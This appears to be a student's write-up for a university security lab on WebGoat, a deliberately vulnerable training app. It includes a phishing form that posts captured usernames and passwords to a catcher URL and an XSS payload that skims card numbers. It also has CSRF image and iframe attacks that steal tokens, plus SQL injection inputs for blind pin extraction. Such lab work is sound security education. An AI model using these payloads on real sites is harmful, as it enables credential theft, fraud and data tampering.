@@ -1,0 +1,119 @@
+#Prerak Chaudhari, 1005114760, prerak.chaudhari@mail.utoronto.ca
+
+Part 1 Explanation:
+-------------------
+
+I created a form that let the user input their username and password,
+and then when they clicked the submit button, a javascript function
+was run which queried the DOM to retrieve the inputted username
+and password and sent a POST request to the specified URL.
+
+<form>
+    <p>Enter Username</p>
+    <input type="text" id="ece568_2022s_user">
+    <p>Enter Password</p>
+    <input type="password" id="ece568_2022s_pw">
+    <br>
+    <input type="submit" id="ece568_2022s_submit" onclick="hack()" value="Login">
+</form>>
+
+<script type="text/javascript">
+    function hack() {
+        const username = document.getElementById("ece568_2022s_user").value;
+        const password = document.getElementById("ece568_2022s_pw").value;
+        fetch(`http://localhost:25565/WebGoat/catcher?PROPERTY=yes&phishingUsername=${username}&phishingPassword=${password}`, {method: 'POST'})
+    }
+</script>
+
+Part 2 Explanation:
+-------------------
+
+The below script adds an event handler to the form button so that
+on clicks, the credit card number is sent to the malicious URL.
+Also, it modifies the DOM so that the website appears unmodified. 
+
+<script type="text/javascript">
+    document.getElementsByName("buy")[0].addEventListener("click", function(){
+        const num = document.getElementsByName("input1")[0].value;
+        fetch(`http://localhost:25565/WebGoat/catcher?PROPERTY=yes&stolenCardNum=${num}`, {method: 'POST'});
+    });
+    document.getElementById("message").remove();
+    document.getElementsByName("input2")[0].value = "000";
+</script>
+
+Below is the unencoded attack URL:
+
+http://localhost:25565/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=<script type="text/javascript"> document.getElementsByName("buy")[0].addEventListener("click", function(){ const num = document.getElementsByName("input1")[0].value; fetch(`http://localhost:25565/WebGoat/catcher?PROPERTY=yes&stolenCardNum=${num}`, {method: 'POST'}); }); document.getElementById("message").remove(); document.getElementsByName("input2")[0].value = "000";</script>
+
+
+Part 3 Explanation:
+-------------------
+
+I used the <img> tag to cause the victim's browser to go to the
+malicious URL while they have a valid cookie when they open
+the email and view its message contents.
+
+Part 4 Explanation:
+-------------------
+
+The same method from Part 3 is used here. Firstly, the victim's
+browser visits the malicious URL with the transfer query parameter
+indicating how much to transfer. Then, the URL is visited again
+with the parameter being set to CONFIRMED to confirm the transfer.
+
+<img src="http://localhost:25565/WebGoat/attack?Screen=2094584595&menu=900&transfer=5000">
+<img src="http://localhost:25565/WebGoat/attack?Screen=2094584595&menu=900&transfer=CONFIRMED">
+
+Part 5 Explanation:
+-------------------
+
+Firstly, an iframe is used to visit the malicious URL with the
+transfer query parameter set to main. Upon load, a javascript
+function reads the iframe's DOM and finds the token. Then a second
+iframe is used to to visit the malicious URL with the token and
+transfer amount set as query parameters.
+
+<iframe src="http://localhost:25565/WebGoat/attack?Screen=605842438&menu=900&transfer=main" onload="hack()" id="first"></iframe>>
+<iframe id="second"></iframe>
+
+<script type="text/javascript">
+    function hack() {
+        const token =
+            document
+            .getElementById("first")
+            .contentDocument
+            .getElementsByName("token")[0]
+            .value;
+    
+        document.getElementById("second").src = `http://localhost:25565/WebGoat/attack?Screen=605842438&menu=900&transfer=5000&token=${token}`;
+    }
+</script>
+
+Part 6 Explanation:
+-------------------
+
+The user input adds an OR operator to the SQL statement that is true
+for every row.
+
+Part 7 Explanation:
+-------------------
+
+For Stage 1, I inject a second SQL statement that updates the salary
+column of the desired employee (who is found by userid).
+
+For Stage 2, I created a trigger using the boilerplate provided by
+WebGoat on the lesson page. I specified the trigger to set the
+email column of the employee table to the desired email address
+whenever a new record is added.
+
+Part 8 Explanation:
+-------------------
+
+The below user input modifies the query to also check if the pin
+was guessed correctly:
+
+101 AND ((SELECT pin FROM credit WHERE cc_number=1234123412341234) = 3318)
+
+The correct pin was found by using binary search as follows:
+the final conditional was changed to check if the returned pin is
+greater than, less than, or equal to, a specified integer.
